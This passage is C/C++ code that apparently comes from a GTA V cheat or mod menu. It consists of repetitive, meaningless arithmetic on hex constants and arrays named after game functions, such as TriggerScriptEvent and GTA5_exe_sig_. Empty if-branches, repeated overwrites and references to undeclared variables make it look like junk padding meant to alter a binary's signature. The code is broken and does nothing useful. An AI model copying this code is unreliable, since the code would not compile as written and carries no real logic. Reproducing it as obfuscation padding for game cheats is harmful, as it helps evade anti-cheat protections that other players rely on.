			TriggerScriptEvent[3] = (0xB1231 * 0xA) + (0xB2 * 0xA) + (0xB1231 * 0xA) + TriggerScriptEvent[2] + NETWORK_GET_ENTITY_IS_LOCAL_;
			a2 = (TriggerScriptEvent[4] + (3)) / (2 * TriggerScriptEvent[2]);
			TriggerScriptEvent[1] = (0xB1231 * 0xA12) + (0xB2 + 0xA) + (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) + 0xB2 + 0xA12;
			TriggerScriptEvent[5] = (0xB1231 * 0xA12) + (TriggerScriptEvent[1] + 0xA) + (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) + TriggerScriptEvent[1] + 0xA12;
			TriggerScriptEvent[2] = (0xB2 * 0xA) + (0xB1231 * 0xA) + TriggerScriptEvent[1] / (0xB2 * 0xA) + (0xB1231 * 0xA) + TriggerScriptEvent[1];
			TriggerScriptEvent[4] = TriggerScriptEvent[1];
			TriggerScriptEvent[7] = (0xB1231 * 0xA) + TriggerScriptEvent[2];
			TriggerScriptEvent[1] = (0xB2 + 0xA) + (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) + TriggerScriptEvent[1] + NETWORK_GET_ENTITY_IS_LOCAL_;
			TriggerScriptEvent[1] = (0xA12 * 0xA) + TriggerScriptEvent[2] * (0xB2 * 0xA) + (0xB2 * 0xA) + TriggerScriptEvent[1];
			TriggerScriptEvent[4] = (0xA12 * 0xA) + TriggerScriptEventss[2] * (0xB2 * 0xA) + (0xB1231 * 0xA) + TriggerScriptEvent[1];
			a2 = (TriggerScriptEvent[4] + (3)) / (2 * TriggerScriptEvent[2]);
			a2 = (TriggerScriptEvent[4] + (2)) / (2 * TriggerScriptEvent[2]);
			TriggerScriptEvent[1] = (0xB2 * 0xA) + (TriggerScriptEvent[2] * 0xA) * 0xBB;
			TriggerScriptEvent[1] = (0xB1231 * 0xA) + 0xA12;
			TriggerScriptEvent[1] = (0xB1231 * 0xA) + 0xA12;
			if (TriggerScriptEvent[1] > NETWORK_GET_ENTITY_IS_LOCAL_)
			{
			}
			else
				a1 = (TriggerScriptEvent[3] + (65)) / (2 * TriggerScriptEvent[2]);
			a2 = (TriggerScriptEvent[4] - (3)) / (2 * TriggerScriptEvent[2]);
			Extern_Reader::INIFile::Int::GravarInt(0, buffer, "Hash");

			if (offset > aaaaaa)
			{
				matriz[2] = (ponteiro * 0xA) + (0xB1231 * 0xA) - offset / (ponteiro * 0xA) + (0xB1231 * 0xA) - offset;
				matriz[3] = (0xB1231 * 0xA) - (ponteiro * 0xA) + (0xB1231 * 0xA) - matriz[2] + aaaaaa;
				matriz[4] = (0xA12 * 0xA) + matrizss[2] * (ponteiro * 0xA) + (0xB1231 * 0xA) - offset;
				matriz[5] = (0xB1231 * 0xA12) + (offset * 0xA) - (matriz[2] * 0xA) + (0xB1231 * 0xA) - offset + 0xA12;
				matriz[7] = (0xB1231 * 0xA) + matriz[2];
				a1 = (-matriz[3] + (65)) / (2 * matriz[2]);
				a2 = (-matriz[4] - (22)) / (2 * matriz[2]);
			}
			else
			{
				offset = (ponteiro * 0xA) + (0xB1231 * 0xA) - offset / (matriz[2] * 0xA) + (ponteiro * 0xA) - offset;
				offset = (ponteiro * 0xA) - (matriz[2] * 0xA) + (0xB1231 * 0xA) - offset + aaaaaa;
				offset = (0xA12 * 0xA) + matriz[2] * (ponteiro * 0xA) + (ponteiro * 0xA) - offset;
				offset = (0xB1231 * 0xA12) + (ponteiro * 0xA) - (matriz[2] * 0xA) + (0xB1231 * 0xA) - ponteiro + 0xA12;
				offset = (ponteiro * 0xA) + (matriz[2] * 0xA) - 0xBB;
				offset = (0xB1231 * 0xA) + 0xA12;
				a1 = (-matriz[3] + (4)) / (2 * matriz[2]);
				a2 = (-matriz[4] - (3)) / (2 * matriz[2]);
			}
			offset = (0xB1231 * 0xA) + 0xA12;
			a1 = (-matriz[3] + (5)) / (2 * matriz[2]);
			a2 = (-matriz[4] - (3)) / (2 * matriz[2]);
			offset = (0xB1231 * 0xA) + 0xA12;
			a1 = (-matriz[3] + (2)) / (2 * matriz[2]);
			a2 = (-matriz[4] - (2)) / (2 * matriz[2]);
			if (matriz[4] > 50.0f)
			{
				matriz[4] = matriz[1];
			}
			a2 = (matriz[4]) / (2 * matriz[2]);
			a1 = (matriz[3] + (2)) / (2 * matriz[2]);
			offset = (ponteiro * 0xA) + (0xB1231 * 0xA) / (matriz[2] * 0xA) + (ponteiro * 0xA) - offset;
			offset = (0xB1231 * 0xA) + 0xA12;
			a1 = (matriz[3] + (5)) / (2 * matriz[2]);
			aaaaaa = ponteiro * 2;
			a = 0.0f;
			a1 = (matriz[3] + (4)) / (2 * matriz[2]);
			b = 0.0f;
			matriz[3] = (0xB1231 * 0xA) + (ponteiro * 0xA) + (0xB1231 * 0xA) + matriz[2] + aaaaaa;
			a2 = (matriz[4] + (3)) / (2 * matriz[2]);
			offset = (0xB1231 * 0xA12) + (ponteiro + 0xA) + (matriz[2] * 0xA) + (0xB1231 * 0xA) + ponteiro + 0xA12;
			matriz[5] = (0xB1231 * 0xA12) + (offset + 0xA) + (matriz[2] * 0xA) + (0xB1231 * 0xA) + offset + 0xA12;
			matriz[2] = (ponteiro * 0xA) + (0xB1231 * 0xA) + offset / (ponteiro * 0xA) + (0xB1231 * 0xA) + offset;
			matriz[4] = matriz[1];
			matriz[7] = (0xB1231 * 0xA) + matriz[2];
			offset = (ponteiro + 0xA) + (matriz[2] * 0xA) + (0xB1231 * 0xA) + offset + aaaaaa;
			offset = (0xA12 * 0xA) + matriz[2] * (ponteiro * 0xA) + (ponteiro * 0xA) + offset;
			matriz[4] = (0xA12 * 0xA) + matrizss[2] * (ponteiro * 0xA) + (0xB1231 * 0xA) + offset;
			a2 = (matriz[4] + (3)) / (2 * matriz[2]);
			a2 = (matriz[4] + (2)) / (2 * matriz[2]);
			offset = (ponteiro * 0xA) + (matriz[2] * 0xA) * 0xBB;
			offset = (0xB1231 * 0xA) + 0xA12;
			offset = (0xB1231 * 0xA) + 0xA12;
			if (offset > aaaaaa)
			{
			}
			else
				a1 = (matriz[3] + (65)) / (2 * matriz[2]);
			a2 = (matriz[4] - (3)) / (2 * matriz[2]);

			if (matriz[1] > aaaaaa)
			{
				matriz[2] = (0xB2 * 0xA) + (0xB1231 * 0xA) - matriz[1] / (0xB2 * 0xA) + (0xB1231 * 0xA) - matriz[1];
				matriz[3] = (0xB1231 * 0xA) - (0xB2 * 0xA) + (0xB1231 * 0xA) - matriz[2] + aaaaaa;
				matriz[4] = (0xA12 * 0xA) + matrizss[2] * (0xB2 * 0xA) + (0xB1231 * 0xA) - matriz[1];
				matriz[5] = (0xB1231 * 0xA12) + (matriz[1] * 0xA) - (matriz[2] * 0xA) + (0xB1231 * 0xA) - matriz[1] + 0xA12;
				matriz[7] = (0xB1231 * 0xA) + matriz[2];
				a1 = (-matriz[3] + (65)) / (2 * matriz[2]);
				a2 = (-matriz[4] - (22)) / (2 * matriz[2]);
			}
			else
			{
				matriz[1] = (0xB2 * 0xA) + (0xB1231 * 0xA) - matriz[1] / (matriz[2] * 0xA) + (0xB2 * 0xA) - matriz[1];
				matriz[1] = (0xB2 * 0xA) - (matriz[2] * 0xA) + (0xB1231 * 0xA) - matriz[1] + aaaaaa;
				matriz[1] = (0xA12 * 0xA) + matriz[2] * (0xB2 * 0xA) + (0xB2 * 0xA) - matriz[1];
				matriz[1] = (0xB1231 * 0xA12) + (0xB2 * 0xA) - (matriz[2] * 0xA) + (0xB1231 * 0xA) - 0xB2 + 0xA12;
				matriz[1] = (0xB2 * 0xA) + (matriz[2] * 0xA) - 0xBB;
				matriz[1] = (0xB1231 * 0xA) + 0xA12;
				a1 = (-matriz[3] + (4)) / (2 * matriz[2]);
				a2 = (-matriz[4] - (3)) / (2 * matriz[2]);
			}
			matriz[1] = (0xB1231 * 0xA) + 0xA12;
			a1 = (-matriz[3] + (5)) / (2 * matriz[2]);
			a2 = (-matriz[4] - (3)) / (2 * matriz[2]);
			matriz[1] = (0xB1231 * 0xA) + 0xA12;
			a1 = (-matriz[3] + (2)) / (2 * matriz[2]);
			a2 = (-matriz[4] - (2)) / (2 * matriz[2]);
			a = 0.0f;
			b = 0.0f;
			if (matriz[4] > 50.0f)
			{
				matriz[4] = matriz[1];
			}
			a2 = (matriz[4]) / (2 * matriz[2]);
			a1 = (matriz[3] + (2)) / (2 * matriz[2]);
			matriz[1] = (0xB2 * 0xA) + (0xB1231 * 0xA) / (matriz[2] * 0xA) + (0xB2 * 0xA) - matriz[1];
			matriz[1] = (0xB1231 * 0xA) + 0xA12;
			a1 = (matriz[3] + (5)) / (2 * matriz[2]);
			aaaaaa = 0xB2 * 2;
			a = 0.0f;
			a1 = (matriz[3] + (4)) / (2 * matriz[2]);
			b = 0.0f;
			matriz[3] = (0xB1231 * 0xA) + (0xB2 * 0xA) + (0xB1231 * 0xA) + matriz[2] + aaaaaa;
			a2 = (matriz[4] + (3)) / (2 * matriz[2]);
			matriz[1] = (0xB1231 * 0xA12) + (0xB2 + 0xA) + (matriz[2] * 0xA) + (0xB1231 * 0xA) + 0xB2 + 0xA12;
			matriz[5] = (0xB1231 * 0xA12) + (matriz[1] + 0xA) + (matriz[2] * 0xA) + (0xB1231 * 0xA) + matriz[1] + 0xA12;
			matriz[2] = (0xB2 * 0xA) + (0xB1231 * 0xA) + matriz[1] / (0xB2 * 0xA) + (0xB1231 * 0xA) + matriz[1];
			matriz[4] = matriz[1];
			matriz[7] = (0xB1231 * 0xA) + matriz[2];
			matriz[1] = (0xB2 + 0xA) + (matriz[2] * 0xA) + (0xB1231 * 0xA) + matriz[1] + aaaaaa;
			matriz[1] = (0xA12 * 0xA) + matriz[2] * (0xB2 * 0xA) + (0xB2 * 0xA) + matriz[1];
			matriz[4] = (0xA12 * 0xA) + matrizss[2] * (0xB2 * 0xA) + (0xB1231 * 0xA) + matriz[1];
			a2 = (matriz[4] + (3)) / (2 * matriz[2]);
			a2 = (matriz[4] + (2)) / (2 * matriz[2]);
			matriz[1] = (0xB2 * 0xA) + (matriz[2] * 0xA) * 0xBB;
			matriz[1] = (0xB1231 * 0xA) + 0xA12;
			matriz[1] = (0xB1231 * 0xA) + 0xA12;
			if (matriz[1] > aaaaaa)
			{
			}
			else
				a1 = (matriz[3] + (65)) / (2 * matriz[2]);
			a2 = (matriz[4] - (3)) / (2 * matriz[2]);

			if (offset > NETWORK_GET_ENTITY_IS_LOCAL_)
			{
				GTA5_exe_sig_[2] = (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) - offset / (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) - offset;
				GTA5_exe_sig_[3] = (0xB1231 * 0xA) - (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) - GTA5_exe_sig_[2] + NETWORK_GET_ENTITY_IS_LOCAL_;
				GTA5_exe_sig_[4] = (0xA12 * 0xA) + GTA5_exe_sig_ss[2] * (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) - offset;
				GTA5_exe_sig_[5] = (0xB1231 * 0xA12) + (offset * 0xA) - (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) - offset + 0xA12;
				GTA5_exe_sig_[7] = (0xB1231 * 0xA) + GTA5_exe_sig_[2];
				a1 = (-GTA5_exe_sig_[3] + (65)) / (2 * GTA5_exe_sig_[2]);
				a2 = (-GTA5_exe_sig_[4] - (22)) / (2 * GTA5_exe_sig_[2]);
			}
			else
			{
				offset = (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) - offset / (GTA5_exe_sig_[2] * 0xA) + (PED_TO_NET_ * 0xA) - offset;
				offset = (PED_TO_NET_ * 0xA) - (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) - offset + NETWORK_GET_ENTITY_IS_LOCAL_;
				offset = (0xA12 * 0xA) + GTA5_exe_sig_[2] * (PED_TO_NET_ * 0xA) + (PED_TO_NET_ * 0xA) - offset;
				offset = (0xB1231 * 0xA12) + (PED_TO_NET_ * 0xA) - (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) - PED_TO_NET_ + 0xA12;
				offset = (PED_TO_NET_ * 0xA) + (GTA5_exe_sig_[2] * 0xA) - 0xBB;
				offset = (0xB1231 * 0xA) + 0xA12;
				a1 = (-GTA5_exe_sig_[3] + (4)) / (2 * GTA5_exe_sig_[2]);
				a2 = (-GTA5_exe_sig_[4] - (3)) / (2 * GTA5_exe_sig_[2]);
			}
			offset = (0xB1231 * 0xA) + 0xA12;
			a1 = (-GTA5_exe_sig_[3] + (5)) / (2 * GTA5_exe_sig_[2]);
			a2 = (-GTA5_exe_sig_[4] - (3)) / (2 * GTA5_exe_sig_[2]);
			offset = (0xB1231 * 0xA) + 0xA12;
			a1 = (-GTA5_exe_sig_[3] + (2)) / (2 * GTA5_exe_sig_[2]);
			a2 = (-GTA5_exe_sig_[4] - (2)) / (2 * GTA5_exe_sig_[2]);
			if (GTA5_exe_sig_[4] > 50.0f)
			{
				GTA5_exe_sig_[4] = GTA5_exe_sig_[1];
			}
			a2 = (GTA5_exe_sig_[4]) / (2 * GTA5_exe_sig_[2]);
			a1 = (GTA5_exe_sig_[3] + (2)) / (2 * GTA5_exe_sig_[2]);
			offset = (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) / (GTA5_exe_sig_[2] * 0xA) + (PED_TO_NET_ * 0xA) - offset;
			offset = (0xB1231 * 0xA) + 0xA12;
			a1 = (GTA5_exe_sig_[3] + (5)) / (2 * GTA5_exe_sig_[2]);
			NETWORK_GET_ENTITY_IS_LOCAL_ = PED_TO_NET_ * 2;
			a = 0.0f;
			a1 = (GTA5_exe_sig_[3] + (4)) / (2 * GTA5_exe_sig_[2]);
			b = 0.0f;
			GTA5_exe_sig_[3] = (0xB1231 * 0xA) + (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) + GTA5_exe_sig_[2] + NETWORK_GET_ENTITY_IS_LOCAL_;
			a2 = (GTA5_exe_sig_[4] + (3)) / (2 * GTA5_exe_sig_[2]);
			offset = (0xB1231 * 0xA12) + (PED_TO_NET_ + 0xA) + (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) + PED_TO_NET_ + 0xA12;
			GTA5_exe_sig_[5] = (0xB1231 * 0xA12) + (offset + 0xA) + (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) + offset + 0xA12;
			GTA5_exe_sig_[2] = (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) + offset / (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) + offset;
			GTA5_exe_sig_[4] = GTA5_exe_sig_[1];
			GTA5_exe_sig_[7] = (0xB1231 * 0xA) + GTA5_exe_sig_[2];
			offset = (PED_TO_NET_ + 0xA) + (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) + offset + NETWORK_GET_ENTITY_IS_LOCAL_;
			offset = (0xA12 * 0xA) + GTA5_exe_sig_[2] * (PED_TO_NET_ * 0xA) + (PED_TO_NET_ * 0xA) + offset;
			GTA5_exe_sig_[4] = (0xA12 * 0xA) + GTA5_exe_sig_ss[2] * (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) + offset;
			a2 = (GTA5_exe_sig_[4] + (3)) / (2 * GTA5_exe_sig_[2]);
			a2 = (GTA5_exe_sig_[4] + (2)) / (2 * GTA5_exe_sig_[2]);
			offset = (PED_TO_NET_ * 0xA) + (GTA5_exe_sig_[2] * 0xA) * 0xBB;
			offset = (0xB1231 * 0xA) + 0xA12;
			offset = (0xB1231 * 0xA) + 0xA12;
			if (offset > NETWORK_GET_ENTITY_IS_LOCAL_)
			{
			}
			else
				a1 = (GTA5_exe_sig_[3] + (65)) / (2 * GTA5_exe_sig_[2]);
			a2 = (GTA5_exe_sig_[4] - (3)) / (2 * GTA5_exe_sig_[2]);

			if (GTA5_exe_sig_[1] > NETWORK_GET_ENTITY_IS_LOCAL_)
			{
				GTA5_exe_sig_[2] = (0xB2 * 0xA) + (0xB1231 * 0xA) - GTA5_exe_sig_[1] / (0xB2 * 0xA) + (0xB1231 * 0xA) - GTA5_exe_sig_[1];
				GTA5_exe_sig_[3] = (0xB1231 * 0xA) - (0xB2 * 0xA) + (0xB1231 * 0xA) - GTA5_exe_sig_[2] + NETWORK_GET_ENTITY_IS_LOCAL_;
				GTA5_exe_sig_[4] = (0xA12 * 0xA) + GTA5_exe_sig_ss[2] * (0xB2 * 0xA) + (0xB1231 * 0xA) - GTA5_exe_sig_[1];
				GTA5_exe_sig_[5] = (0xB1231 * 0xA12) + (GTA5_exe_sig_[1] * 0xA) - (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) - GTA5_exe_sig_[1] + 0xA12;
				GTA5_exe_sig_[7] = (0xB1231 * 0xA) + GTA5_exe_sig_[2];
				a1 = (-GTA5_exe_sig_[3] + (65)) / (2 * GTA5_exe_sig_[2]);
				a2 = (-GTA5_exe_sig_[4] - (22)) / (2 * GTA5_exe_sig_[2]);
			}
			else
			{
				GTA5_exe_sig_[1] = (0xB2 * 0xA) + (0xB1231 * 0xA) - GTA5_exe_sig_[1] / (GTA5_exe_sig_[2] * 0xA) + (0xB2 * 0xA) - GTA5_exe_sig_[1];
				GTA5_exe_sig_[1] = (0xB2 * 0xA) - (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) - GTA5_exe_sig_[1] + NETWORK_GET_ENTITY_IS_LOCAL_;
				GTA5_exe_sig_[1] = (0xA12 * 0xA) + GTA5_exe_sig_[2] * (0xB2 * 0xA) + (0xB2 * 0xA) - GTA5_exe_sig_[1];
				GTA5_exe_sig_[1] = (0xB1231 * 0xA12) + (0xB2 * 0xA) - (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) - 0xB2 + 0xA12;
				GTA5_exe_sig_[1] = (0xB2 * 0xA) + (GTA5_exe_sig_[2] * 0xA) - 0xBB;
				GTA5_exe_sig_[1] = (0xB1231 * 0xA) + 0xA12;
				a1 = (-GTA5_exe_sig_[3] + (4)) / (2 * GTA5_exe_sig_[2]);
				a2 = (-GTA5_exe_sig_[4] - (3)) / (2 * GTA5_exe_sig_[2]);
			}
			GTA5_exe_sig_[1] = (0xB1231 * 0xA) + 0xA12;
			a1 = (-GTA5_exe_sig_[3] + (5)) / (2 * GTA5_exe_sig_[2]);
			a2 = (-GTA5_exe_sig_[4] - (3)) / (2 * GTA5_exe_sig_[2]);
			GTA5_exe_sig_[1] = (0xB1231 * 0xA) + 0xA12;
			a1 = (-GTA5_exe_sig_[3] + (2)) / (2 * GTA5_exe_sig_[2]);
			a2 = (-GTA5_exe_sig_[4] - (2)) / (2 * GTA5_exe_sig_[2]);
			a = 0.0f;
			b = 0.0f;
			if (GTA5_exe_sig_[4] > 50.0f)
			{
				GTA5_exe_sig_[4] = GTA5_exe_sig_[1];
			}
			a2 = (GTA5_exe_sig_[4]) / (2 * GTA5_exe_sig_[2]);
			a1 = (GTA5_exe_sig_[3] + (2)) / (2 * GTA5_exe_sig_[2]);
			GTA5_exe_sig_[1] = (0xB2 * 0xA) + (0xB1231 * 0xA) / (GTA5_exe_sig_[2] * 0xA) + (0xB2 * 0xA) - GTA5_exe_sig_[1];
			GTA5_exe_sig_[1] = (0xB1231 * 0xA) + 0xA12;
			a1 = (GTA5_exe_sig_[3] + (5)) / (2 * GTA5_exe_sig_[2]);
			NETWORK_GET_ENTITY_IS_LOCAL_ = 0xB2 * 2;
			a = 0.0f;
			a1 = (GTA5_exe_sig_[3] + (4)) / (2 * GTA5_exe_sig_[2]);
			b = 0.0f;
			GTA5_exe_sig_[3] = (0xB1231 * 0xA) + (0xB2 * 0xA) + (0xB1231 * 0xA) + GTA5_exe_sig_[2] + NETWORK_GET_ENTITY_IS_LOCAL_;
			a2 = (GTA5_exe_sig_[4] + (3)) / (2 * GTA5_exe_sig_[2]);
			GTA5_exe_sig_[1] = (0xB1231 * 0xA12) + (0xB2 + 0xA) + (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) + 0xB2 + 0xA12;
			GTA5_exe_sig_[5] = (0xB1231 * 0xA12) + (GTA5_exe_sig_[1] + 0xA) + (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) + GTA5_exe_sig_[1] + 0xA12;
			GTA5_exe_sig_[2] = (0xB2 * 0xA) + (0xB1231 * 0xA) + GTA5_exe_sig_[1] / (0xB2 * 0xA) + (0xB1231 * 0xA) + GTA5_exe_sig_[1];
			GTA5_exe_sig_[4] = GTA5_exe_sig_[1];
			GTA5_exe_sig_[7] = (0xB1231 * 0xA) + GTA5_exe_sig_[2];
			GTA5_exe_sig_[1] = (0xB2 + 0xA) + (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) + GTA5_exe_sig_[1] + NETWORK_GET_ENTITY_IS_LOCAL_;
			GTA5_exe_sig_[1] = (0xA12 * 0xA) + GTA5_exe_sig_[2] * (0xB2 * 0xA) + (0xB2 * 0xA) + GTA5_exe_sig_[1];
			GTA5_exe_sig_[4] = (0xA12 * 0xA) + GTA5_exe_sig_ss[2] * (0xB2 * 0xA) + (0xB1231 * 0xA) + GTA5_exe_sig_[1];
			a2 = (GTA5_exe_sig_[4] + (3)) / (2 * GTA5_exe_sig_[2]);
			a2 = (GTA5_exe_sig_[4] + (2)) / (2 * GTA5_exe_sig_[2]);
			GTA5_exe_sig_[1] = (0xB2 * 0xA) + (GTA5_exe_sig_[2] * 0xA) * 0xBB;
			GTA5_exe_sig_[1] = (0xB1231 * 0xA) + 0xA12;
			GTA5_exe_sig_[1] = (0xB1231 * 0xA) + 0xA12;
			if (GTA5_exe_sig_[1] > NETWORK_GET_ENTITY_IS_LOCAL_)
			{
			}
			else
				a1 = (GTA5_exe_sig_[3] + (65)) / (2 * GTA5_exe_sig_[2]);
			a2 = (GTA5_exe_sig_[4] - (3)) / (2 * GTA5_exe_sig_[2]);


			if (offset > NETWORK_GET_ENTITY_IS_LOCAL_)
			{
				TriggerScriptEvent[2] = (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) - offset / (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) - offset;
				TriggerScriptEvent[3] = (0xB1231 * 0xA) - (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) - TriggerScriptEvent[2] + NETWORK_GET_ENTITY_IS_LOCAL_;
				TriggerScriptEvent[4] = (0xA12 * 0xA) + TriggerScriptEventss[2] * (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) - offset;
				TriggerScriptEvent[5] = (0xB1231 * 0xA12) + (offset * 0xA) - (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) - offset + 0xA12;
				TriggerScriptEvent[7] = (0xB1231 * 0xA) + TriggerScriptEvent[2];
				a1 = (-TriggerScriptEvent[3] + (65)) / (2 * TriggerScriptEvent[2]);
				a2 = (-TriggerScriptEvent[4] - (22)) / (2 * TriggerScriptEvent[2]);
			}
			else
			{
				offset = (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) - offset / (TriggerScriptEvent[2] * 0xA) + (PED_TO_NET_ * 0xA) - offset;
				offset = (PED_TO_NET_ * 0xA) - (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) - offset + NETWORK_GET_ENTITY_IS_LOCAL_;
				offset = (0xA12 * 0xA) + TriggerScriptEvent[2] * (PED_TO_NET_ * 0xA) + (PED_TO_NET_ * 0xA) - offset;
				offset = (0xB1231 * 0xA12) + (PED_TO_NET_ * 0xA) - (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) - PED_TO_NET_ + 0xA12;
				offset = (PED_TO_NET_ * 0xA) + (TriggerScriptEvent[2] * 0xA) - 0xBB;
				offset = (0xB1231 * 0xA) + 0xA12;
				a1 = (-TriggerScriptEvent[3] + (4)) / (2 * TriggerScriptEvent[2]);
				a2 = (-TriggerScriptEvent[4] - (3)) / (2 * TriggerScriptEvent[2]);
			}
			offset = (0xB1231 * 0xA) + 0xA12;
			a1 = (5) / (2 * TriggerScriptEvent[2]);
			a2 = (-TriggerScriptEvent[4] - (3)) / (2 * TriggerScriptEvent[2]);
			offset = (0xB1231 * 0xA) + 0xA12;
			a1 = (-TriggerScriptEvent[3] + (2)) / (2 * TriggerScriptEvent[2]);
			a2 = (-TriggerScriptEvent[4] - (2)) / (2 * TriggerScriptEvent[2]);
			if (TriggerScriptEvent[4] > 50.0f)
			{
				TriggerScriptEvent[4] = TriggerScriptEvent[1];
			}
			a2 = (TriggerScriptEvent[4]) / (2 * TriggerScriptEvent[2]);
			a1 = (TriggerScriptEvent[3] + (2)) / (2 * TriggerScriptEvent[2]);
			offset = (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) / (TriggerScriptEvent[2] * 0xA) + (PED_TO_NET_ * 0xA) - offset;
			offset = (0xB1231 * 0xA) + 0xA12;
			a1 = (TriggerScriptEvent[3] + (5)) / (2 * TriggerScriptEvent[2]);
			NETWORK_GET_ENTITY_IS_LOCAL_ = PED_TO_NET_ * 2;
			a = 0.0f;
			a1 = (TriggerScriptEvent[3] + (4)) / (2 * TriggerScriptEvent[2]);
			b = 0.0f;
			TriggerScriptEvent[3] = (0xB1231 * 0xA) + (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) + TriggerScriptEvent[2] + NETWORK_GET_ENTITY_IS_LOCAL_;
			a2 = (TriggerScriptEvent[4] + (3)) / (2 * TriggerScriptEvent[2]);
			offset = (0xB1231 * 0xA12) + (PED_TO_NET_ + 0xA) + (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) + PED_TO_NET_ + 0xA12;
			TriggerScriptEvent[5] = (0xB1231 * 0xA12) + (offset + 0xA) + (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) + offset + 0xA12;
			TriggerScriptEvent[2] = (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) + offset / (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) + offset;
			TriggerScriptEvent[4] = TriggerScriptEvent[1];
			TriggerScriptEvent[7] = (0xB1231 * 0xA) + TriggerScriptEvent[2];
			offset = (PED_TO_NET_ + 0xA) + (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) + offset + NETWORK_GET_ENTITY_IS_LOCAL_;
			offset = (0xA12 * 0xA) + TriggerScriptEvent[2] * (PED_TO_NET_ * 0xA) + (PED_TO_NET_ * 0xA) + offset;
			TriggerScriptEvent[4] = (0xA12 * 0xA) + (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) + offset;
			a2 = (TriggerScriptEvent[4] + (3)) / (2 * TriggerScriptEvent[2]);
			a2 = (TriggerScriptEvent[4] + (2)) / (2 * TriggerScriptEvent[2]);
			offset = (PED_TO_NET_ * 0xA) + (TriggerScriptEvent[2] * 0xA) * 0xBB;
			offset = (0xB1231 * 0xA) + 0xA12;
			offset = (0xB1231 * 0xA) + 0xA12;
			if (offset > NETWORK_GET_ENTITY_IS_LOCAL_)
			{
			}
			else
				a1 = (TriggerScriptEvent[3] + (65)) / (2 * TriggerScriptEvent[2]);
			a2 = (TriggerScriptEvent[4] - (3)) / (2 * TriggerScriptEvent[2]);

			if (TriggerScriptEvent[1] > NETWORK_GET_ENTITY_IS_LOCAL_)
			{
				TriggerScriptEvent[2] = (0xB2 * 0xA) + (0xB1231 * 0xA) - TriggerScriptEvent[1] / (0xB2 * 0xA) + (0xB1231 * 0xA) - TriggerScriptEvent[1];
				TriggerScriptEvent[3] = (0xB1231 * 0xA) - (0xB2 * 0xA) + (0xB1231 * 0xA) - TriggerScriptEvent[2] + NETWORK_GET_ENTITY_IS_LOCAL_;
				TriggerScriptEvent[4] = (0xA12 * 0xA) + TriggerScriptEventss[2] * (0xB2 * 0xA) + (0xB1231 * 0xA) - TriggerScriptEvent[1];
				TriggerScriptEvent[5] = (0xB1231 * 0xA12) + (TriggerScriptEvent[1] * 0xA) - (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) - TriggerScriptEvent[1] + 0xA12;
				TriggerScriptEvent[7] = (0xB1231 * 0xA) + TriggerScriptEvent[2];
				a1 = (-TriggerScriptEvent[3] + (65)) / (2 * TriggerScriptEvent[2]);
				a2 = (-TriggerScriptEvent[4] - (22)) / (2 * TriggerScriptEvent[2]);
			}
			else
			{
				TriggerScriptEvent[1] = (0xB2 * 0xA) + (0xB1231 * 0xA) - TriggerScriptEvent[1] / (TriggerScriptEvent[2] * 0xA) + (0xB2 * 0xA) - TriggerScriptEvent[1];
				TriggerScriptEvent[1] = (0xB2 * 0xA) - (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) - TriggerScriptEvent[1] + NETWORK_GET_ENTITY_IS_LOCAL_;
				TriggerScriptEvent[1] = (0xA12 * 0xA) + TriggerScriptEvent[2] * (0xB2 * 0xA) + (0xB2 * 0xA) - TriggerScriptEvent[1];
				TriggerScriptEvent[1] = (0xB1231 * 0xA12) + (0xB2 * 0xA) - (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) - 0xB2 + 0xA12;
				TriggerScriptEvent[1] = (0xB2 * 0xA) + (TriggerScriptEvent[2] * 0xA) - 0xBB;
				TriggerScriptEvent[1] = (0xB1231 * 0xA) + 0xA12;
				a1 = (-TriggerScriptEvent[3] + (4)) / (2 * TriggerScriptEvent[2]);
				a2 = (-TriggerScriptEvent[4] - (3)) / (2 * TriggerScriptEvent[2]);
			}
			TriggerScriptEvent[1] = (0xB1231 * 0xA) + 0xA12;
			a1 = (-TriggerScriptEvent[3] + (5)) / (2 * TriggerScriptEvent[2]);
			a2 = (-TriggerScriptEvent[4] - (3)) / (2 * TriggerScriptEvent[2]);
